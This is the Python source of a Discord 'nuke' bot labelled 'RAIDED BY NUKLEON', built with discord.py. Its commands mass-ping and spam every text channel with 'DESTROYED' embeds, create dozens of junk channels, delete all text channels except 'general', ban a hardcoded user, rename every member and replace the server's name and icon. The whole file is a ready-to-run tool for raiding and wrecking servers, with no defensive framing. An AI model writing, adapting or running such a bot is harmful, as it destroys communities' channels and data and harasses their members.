import discord
import aiohttp
from discord.ext import commands

intents = discord.Intents().all()
bot = commands.Bot(command_prefix="•", intents=intents, case_insensitive=True)
bot.remove_command('help')

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    

@bot.command()
async def cs(ctx, count: int = 10):
    if count < 1:
        await ctx.send("Please specify a positive number of embeds to send.")
        return

    embed = discord.Embed(
        title="DESTROYED BY NUKLEON HTS ON TOP",
        description="Status: :red_circle:Destroyed:red_circle: ```DESTROYED BY NUKLEON AND HTS```",
        color=0xFF0000
    )
    
    # Add the image to the embed
    embed.set_image(url="https://cdn.discordapp.com/attachments/1046803911308214282/1178698678823833650/Radioactive_Yellow.svg.png?ex=657717b0&is=6564a2b0&hm=cbd54c8b8650bc2037d437253051ecb76538d9a2b59b5c6b3a89e89ea54af0cc&")

    for channel in ctx.guild.text_channels:
        for _ in range(count):
            await channel.send("@everyone ", embed=embed)

    # Add a server invite link
    invite_link = await ctx.channel.create_invite(max_uses=1, unique=True)
    await ctx.send(f"Server Invite: https://discord.com/invite/duFzfbTJ6v")


@bot.command()
async def caute(ctx):
    for i in range(50):
        await ctx.guild.create_text_channel("RAIDED BY NUKLEON")

@bot.command()
async def remove(ctx):
    general_channel = discord.utils.get(ctx.guild.text_channels, name="general")
    
    
    for channel in ctx.guild.text_channels:
        if channel != general_channel:
            await channel.delete()

    await ctx.send("All text channels except 'general' have been removed.")

@bot.command()
async def ban(ctx):
    user_id_to_ban = 651095740390834176
    user_to_ban = discord.Object(id=user_id_to_ban)

    try:
        await ctx.guild.ban(user_to_ban)
        await ctx.send(f"User with ID {user_id_to_ban} has been banned.")
    except discord.Forbidden:
        await ctx.send("I don't have permission to ban that user.")
        
@bot.command()
async def gn(ctx):
    # Check if the command user has the necessary permissions
    if ctx.author.guild_permissions.manage_nicknames:
        # Change usernames to "NUKLEON"
        for member in ctx.guild.members:
            try:
                await member.edit(nick="#RAIDED BY NUKLEON")
            except discord.Forbidden:
                # Handle cases where the bot doesn't have permission to change a user's nickname
                pass
        await ctx.send("Usernames have been changed to NUKLEON.")
    else:
        await ctx.send("You don't have the required permissions to manage nicknames.")
        
@bot.command()
async def mámese(ctx):
    # Check if the command user has the necessary permissions
    if ctx.author.guild_permissions.manage_guild:
        # Change server icon
        icon_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/Radioactive_Yellow.svg/2187px-Radioactive_Yellow.svg.png"
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as resp:
                icon_data = await resp.read()
                await ctx.guild.edit(icon=icon_data)

        # Change server name
        new_name = "RAIDED BY NUKLEON"
        await ctx.guild.edit(name=new_name)

        await ctx.send("Server icon and name have been changed.")
    else:
        await ctx.send("You don't have the required permissions to manage the server.")

        
@bot.command()
async def info(ctx, count: int = 10):
    if count < 1:
        await ctx.send("Please specify a positive number of embeds to send.")
        return

    embed = discord.Embed(
        title="DESTROYED BY NUKLEON HTS ON TOP",
        description="Status: :red_circle:Destroyed:red_circle: ```DESTROYED BY NUKLEON AND HTS```",
        color=0xFF0000
    )
    
    # Add the image to the embed
    embed.set_image(url="https://cdn.discordapp.com/attachments/1046803911308214282/1178698678823833650/Radioactive_Yellow.svg.png?ex=657717b0&is=6564a2b0&hm=cbd54c8b8650bc2037d437253051ecb76538d9a2b59b5c6b3a89e89ea54af0cc&")

    for channel in ctx.guild.text_channels:
        for _ in range(count):
            await channel.send("informations", embed=embed)

    # Add a server invite link
    invite_link = await ctx.channel.create_invite(max_uses=1, unique=True)
    await ctx.send(f"Server Invite: https://discord.com/invite/duFzfbTJ6v")
    
bot.run("your_token")
